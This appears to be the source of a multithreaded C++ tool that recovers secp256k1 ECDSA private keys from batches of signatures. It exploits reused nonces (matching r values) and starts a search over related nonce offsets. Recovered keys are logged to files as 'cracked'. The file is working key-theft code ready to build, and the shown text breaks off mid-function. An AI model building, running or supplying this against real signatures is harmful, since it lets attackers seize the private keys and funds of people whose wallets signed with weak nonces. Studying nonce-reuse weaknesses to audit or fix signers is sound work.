// ecdsa_recover_strict.cpp
// Build:
/*
sudo apt-get update && sudo apt-get install -y g++ libsecp256k1-dev libssl-dev
g++ -O3 -march=native -flto -fexceptions -pthread -std=c++17 \
    ecdsa_recover_strict.cpp -o ecdsa_recover_strict \
    -lsecp256k1 -lcrypto -lpthread -Wno-deprecated-declarations
*/

#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <sstream>
#include <map>
#include <set>
#include <mutex>
#include <thread>
#include <atomic>
#include <algorithm>
#include <cctype>
#include <cstring>
#include <filesystem>
#include <chrono>

#include <secp256k1.h>
#include <secp256k1_recovery.h>
#include <openssl/sha.h>
#include <openssl/bn.h>
#include <openssl/rand.h>
#include <openssl/crypto.h>

using namespace std;
namespace fs = std::filesystem;

// ------------------------------- Global Constraints & Constants -------------------------------
static const char* N_HEX = "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141";

// Basic String Helpers
static inline string hexlower(const string& s) {
    string t = s; for(char& c : t) c = tolower((unsigned char)c); return t;
}

static inline bool is_hexlike(const string& s) {
    if(s.empty()) return false;
    for(char c : s) if(!isxdigit((unsigned char)c)) return false;
    return true;
}

static string to_hex(const unsigned char* p, size_t n) {
    static const char* he = "0123456789abcdef";
    string s; s.resize(n * 2);
    for(size_t i = 0; i < n; i++) {
        s[2*i]     = he[p[i] >> 4];
        s[2*i + 1] = he[p[i] & 0xF];
    }
    return s;
}

static vector<unsigned char> from_hex(const string& hex) {
    string s = hex;
    if(s.length() % 2 != 0) s = "0" + s;
    vector<unsigned char> res;
    res.reserve(s.length() / 2);
    for (size_t i = 0; i < s.length(); i += 2) {
        unsigned int byte;
        sscanf(s.substr(i, 2).c_str(), "%x", &byte);
        res.push_back((unsigned char)byte);
    }
    return res;
}

// ------------------------------- Simple Micro-JSON Parser -------------------------------
static string extract_json_field(const string& line, const string& key) {
    size_t pos = line.find("\"" + key + "\"");
    if (pos == string::npos) return "";
    pos = line.find(":", pos);
    if (pos == string::npos) return "";
    size_t start = line.find("\"", pos);
    if (start != string::npos) {
        size_t end = line.find("\"", start + 1);
        if (end != string::npos) return line.substr(start + 1, end - start - 1);
    } else {
        size_t run = pos + 1;
        while(run < line.size() && (isspace(line[run]) || line[run] == ',' || line[run] == ':')) run++;
        size_t vend = run;
        while(vend < line.size() && line[vend] != ',' && line[vend] != '}' && line[vend] != ']') vend++;
        string chunk = line.substr(run, vend - run);
        chunk.erase(remove_if(chunk.begin(), chunk.end(), ::isspace), chunk.end());
        return chunk;
    }
    return "";
}

// ------------------------------- Crypto Structure -------------------------------
struct SignatureEntry {
    string index;
    string msg_hex;
    string r_hex;
    string s_hex;
    int v = -1;
    string pub_hex;
    
    // Extracted Hex representations for high-performance context allocation per thread
    string r_clean;
    string s_clean;
    string z_clean;
};

// Global Thread Safe Managers
static mutex g_out_mutex;
static ofstream g_out_json_f;
static ofstream g_out_txt_f;
static ofstream g_out_k_f;
static ofstream g_out_deltas_f;

static set<string> g_found_privkeys;
static atomic<long long> g_total_iterations(0);
static atomic<long long> g_keys_cracked(0);

// ------------------------------- Key Derivation Validation -------------------------------
static bool verify_and_log_privkey(const string& p_hex, const SignatureEntry& entry, const string& source_method) {
    lock_guard<mutex> lock(g_out_mutex);
    if (g_found_privkeys.count(p_hex)) return true;
    
    secp256k1_context* ctx = secp256k1_context_create(SECP256K1_CONTEXT_SIGN | SECP256K1_CONTEXT_VERIFY);
    vector<unsigned char> priv_bytes = from_hex(p_hex);
    secp256k1_pubkey pubkey;
    
    if (secp256k1_ec_pubkey_create(ctx, &pubkey, priv_bytes.data()) == 1) {
        unsigned char pub_compressed[33];
        size_t out_len = 33;
        secp256k1_ec_pubkey_serialize(ctx, pub_compressed, &out_len, &pubkey, SECP256K1_EC_COMPRESSED);
        string computed_pub = to_hex(pub_compressed, out_len);
        
        g_found_privkeys.insert(p_hex);
        g_keys_cracked++;
        
        if (g_out_txt_f.is_open()) {
            g_out_txt_f << p_hex << " # Found via " << source_method << " on entry index " << entry.index << "\n" << flush;
        }
        if (g_out_json_f.is_open()) {
            g_out_json_f << "{\"index\":\"" << entry.index << "\",\"method\":\"" << source_method 
                         << "\",\"private_key\":\"" << p_hex << "\",\"public_key\":\"" << computed_pub << "\"}\n" << flush;
        }
        
        cout << "\n[!] SUCCESS: Private Key Found (" << source_method << "): 0x" << p_hex << "\n";
        secp256k1_context_destroy(ctx);
        return true;
    }
    secp256k1_context_destroy(ctx);
    return false;
}

// Extract Private Key using a solved ephemeral candidate k via native OpenSSL BIGNUM API
static bool test_k_candidate(BIGNUM* k, const BIGNUM* r, const BIGNUM* s, const BIGNUM* z, const BIGNUM* N, BN_CTX* ctx, const SignatureEntry& entry, const string& method) {
    if (BN_is_zero(k) || BN_cmp(k, N) >= 0) return false;
    
    BIGNUM* r_inv = BN_new();
    BIGNUM* sk = BN_new();
    BIGNUM* sk_z = BN_new();
    BIGNUM* priv = BN_new();
    bool success = false;

    // r_inv = r^-1 mod N
    if (BN_mod_inverse(r_inv, r, N, ctx)) {
        // sk = (s * k) mod N
        BN_mod_mul(sk, s, k, N, ctx);
        // sk_z = (sk - z) mod N
        BN_mod_sub(sk_z, sk, z, N, ctx);
        // priv = (sk_z * r_inv) mod N
        BN_mod_mul(priv, sk_z, r_inv, N, ctx);

        char* hex_str = BN_bn2hex(priv);
        if (hex_str) {
            string p_hex = hexlower(string(hex_str));
            OPENSSL_free(hex_str);
            while(p_hex.size() < 64) p_hex = "0" + p_hex;

            if (verify_and_log_privkey(p_hex, entry, method)) {
                if (g_out_k_f.is_open()) {
                    char* k_hex_str = BN_bn2hex(k);
                    if (k_hex_str) {
                        string k_hex = hexlower(string(k_hex_str));
                        OPENSSL_free(k_hex_str);
                        lock_guard<mutex> lock(g_out_mutex);
                        g_out_k_f << "{\"index\":\"" << entry.index << "\",\"k_hex\":\"" << k_hex << "\"}\n" << flush;
                    }
                }
                success = true;
            }
        }
    }

    BN_free(r_inv);
    BN_free(sk);
    BN_free(sk_z);
    BN_free(priv);
    return success;
}

// ------------------------------- Worker Engine Core -------------------------------
void execution_worker(int thread_id, const vector<SignatureEntry>& entries, 
                      int max_iter, long long dg_max_delta, const vector<long long>& dg_seeds,
                      int dg_fill_step, int dg_per_pair_cap, const vector<long long>& step_seeds,
                      long long lcg_a_max, long long lcg_b_max, int lcg_per_pair_cap,
                      int scan_rand_k) {
    
    BN_CTX* ctx = BN_CTX_new();
    BIGNUM* N = BN_new();
    BN_hex2bn(&N, N_HEX);

    // Track state buffers
    BIGNUM* top = BN_new();
    BIGNUM* bot = BN_new();
    BIGNUM* bot_inv = BN_new();
    BIGNUM* k_sol = BN_new();
    BIGNUM* r_ratio = BN_new();
    BIGNUM* e2_r_inv = BN_new();
    BIGNUM* num = BN_new();
    BIGNUM* den = BN_new();
    BIGNUM* den_inv = BN_new();
    BIGNUM* tmp = BN_new();
    BIGNUM* target_k_delta = BN_new();
    BIGNUM* bn_a = BN_new();
    BIGNUM* bn_b = BN_new();

    size_t total = entries.size();
    for (size_t i = thread_id; i < total; i += max_iter) {
        const auto& e1 = entries[i];
        BIGNUM* e1_r = BN_new(); BN_hex2bn(&e1_r, e1.r_clean.c_str());
        BIGNUM* e1_s = BN_new(); BN_hex2bn(&e1_s, e1.s_clean.c_str());
        BIGNUM* e1_z = BN_new(); BN_hex2bn(&e1_z, e1.z_clean.c_str());
        
        for (size_t j = i + 1; j < total; j++) {
            const auto& e2 = entries[j];
            BIGNUM* e2_r = BN_new(); BN_hex2bn(&e2_r, e2.r_clean.c_str());
            BIGNUM* e2_s = BN_new(); BN_hex2bn(&e2_s, e2.s_clean.c_str());
            BIGNUM* e2_z = BN_new(); BN_hex2bn(&e2_z, e2.z_clean.c_str());

            g_total_iterations++;
            
            // --- Strategy 1: Shared k analysis ---
            if (BN_cmp(e1_r, e2_r) == 0 && BN_cmp(e1_s, e2_s) != 0) {
                BN_mod_sub(top, e1_z, e2_z, N, ctx);
                BN_mod_sub(bot, e1_s, e2_s, N, ctx);
                if (BN_mod_inverse(bot_inv, bot, N, ctx)) {
                    BN_mod_mul(k_sol, top, bot_inv, N, ctx);
                    test_k_candidate(k_sol, e1_r, e1_s, e1_z, N, ctx, e1, "Shared Nonce (k1=k2)");
                }
            }

            // Precompute shared scaling properties for systems calculations
            if (BN_mod_inverse(e2_r_inv, e2_r, N, ctx)) {
                BN_mod_mul(r_ratio, e1_r, e2_r_inv, N, ctx);

                // --- Strategy 2: Differential Gap Multipliers ---
                int pair_dg_count = 0;
                for (long long seed : dg_seeds) {
                    if (pair_dg_count >= dg_per_pair_cap) break;
                    
                    for (long long delta = -dg_max_delta; delta <= dg_max_delta; delta += dg_fill_step) {
                        long long val = seed + delta;
                        if (val <= 0) continue;
                        pair_dg_count++;

                        BN_set_word(target_k_delta, (unsigned long long)val);

                        // num = (s2 * delta - z1 + r_ratio * z2) mod N
                        BN_mod_mul(tmp, e2_s, target_k_delta, N, ctx);
